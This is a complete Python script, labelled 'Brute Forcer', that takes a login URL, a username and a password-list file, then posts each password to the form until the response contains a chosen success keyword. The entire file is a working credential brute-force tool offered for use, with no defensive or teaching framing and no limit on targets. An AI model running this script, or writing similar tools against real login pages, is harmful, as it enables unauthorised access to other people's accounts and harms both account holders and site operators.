import requests
import time
import sys

def brute_force_login(url, username, password_list, success_indicator, delay=0):
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; BruteForcer/1.0)"
    }

    for count, password in enumerate(password_list, start=1):
        password = password.strip()
        try:
            response = requests.post(url, data={'username': username, 'password': password}, headers=headers, timeout=5)

            print(f"Trying [{count}/{len(password_list)}]: {password}", end='\r')

            if success_indicator in response.text:
                print(f"\n[SUCCESS] Password found: {password}")
                return password
        except requests.RequestException as e:
            print(f"\n[ERROR] Request failed for password '{password}': {e}")
        if delay:
            time.sleep(delay)

    print("\nBrute force attempt failed. No matching password found.")
    return None

if __name__ == "__main__":
    print("==== Brute Forcer ====")
    url = input("Enter the login URL: ").strip()
    username = input("Enter the username: ").strip()
    password_file = input("Enter path to password list file: ").strip()
    success_indicator = input("Enter success keyword from response (e.g., 'Login successful'): ").strip()
    delay_input = input("Delay between requests in seconds (optional): ").strip()
    delay = float(delay_input) if delay_input else 0

    try:
        with open(password_file, 'r') as file:
            passwords = file.readlines()
            brute_force_login(url, username, passwords, success_indicator, delay)
    except FileNotFoundError:
        print(f"[ERROR] Password list file not found: {password_file}")
    except KeyboardInterrupt:
        print("\n[!] Brute force interrupted by user.")
        sys.exit()
